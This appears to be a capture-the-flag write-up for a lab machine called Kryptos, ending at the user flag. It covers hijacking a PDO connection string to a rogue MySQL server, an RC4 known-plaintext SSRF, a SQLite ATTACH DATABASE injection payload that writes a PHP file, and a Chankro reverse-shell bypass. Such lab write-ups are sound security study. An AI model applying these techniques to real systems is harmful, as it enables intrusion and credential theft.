## Overview

Kryptos is an Insane Linux machine where every step abuses a *broken implementation* of an otherwise-sound algorithm. Only SSH and Apache are exposed. The web login page hands the client control of the database connection string, which is leveraged into capturing and cracking a MySQL hash, reaching an RC4 encryption page vulnerable to a known-plaintext attack, then an internal SQLite-injection endpoint that — via a Chankro payload — bypasses PHP's `disabled_functions` for code execution. A reused-IV Vim-encrypted credentials file finally decrypts to a user SSH password. This post stops at the user flag.

## Enumeration

A directory brute-force surfaces a `/dev` folder (forbidden) and a login page at the web root. Viewing the HTML source of the login form shows it submits two unusual extra fields alongside `username`/`password`:

- `db`
- `token`

A `db` value being sent from the client is a strong tell that it feeds a backend database connection. Injecting a single quote into it returns a PDO exception (code `1044`, access denied) — confirming the value is concatenated into a PHP **PDO DSN** (Data Source Name).

## Foothold

**1 — Hijack the PDO connection string.** Because the `db` field becomes the DSN, appending a `host=` directive redirects the box's MySQL authentication to a server we control:

```text
db = cryptor;host=<lhost>
```

Standing up a rogue MySQL capture server (e.g. Metasploit `auxiliary/server/capture/mysql`) and forwarding the login request captures the `dbuser` authentication hash, which cracks against rockyou:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash_mysqlna --fork=4
# dbuser : <redacted>
```

**2 — Satisfy the login.** Recreating the expected `cryptor` database, the `users` table, and the `admin` / MD5(`admin`) row locally (the requested schema is visible in Wireshark) lets the captured credentials authenticate and lands `encrypt.php`.

**3 — RC4 known-plaintext + SSRF.** `encrypt.php` encrypts remote URLs with a fixed RC4 keystream. Encrypting our own known file plus an internal page and XORing the two ciphertexts cancels the keystream (`C1 ^ C2 = M1 ^ M2`), recovering the plaintext of internal pages — an SSRF that reads the `/dev` source through `localhost`.

**4 — SQLite injection → file write.** `/dev` contains `sqlite_test_page.php`, which concatenates a `bookid` parameter straight into a SQLite query. SQLite's `ATTACH DATABASE` turns that into arbitrary file write inside a world-writable folder:

```text
http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1; ATTACH DATABASE '<writable>/put.php' AS put; CREATE TABLE put.put(data TEXT); INSERT INTO put.put VALUES('<?php ... ?>');
```

**5 — Chankro RCE.** PHP `disabled_functions` blocks the usual exec calls, so a [Chankro](https://github.com/TarlogicSecurity/Chankro) payload abuses `mail()` → `sendmail` to run a bash reverse shell, giving a shell as `www-data`.

**6 — Decrypt the user's password.** `rijndael`'s home holds `creds.old` (`rijndael / Password1`) and `creds.txt`, a `VimCrypt~02!` (Blowfish-CFB) file. That format has a bug: the first eight blocks all reuse the same IV, so the keystream repeats. XORing the known plaintext `rijndael` against the first ciphertext block recovers the keystream and decrypts the rest to the new SSH password:

```bash
sshpass -p '<redacted>' ssh rijndael@10.129.9.159
```
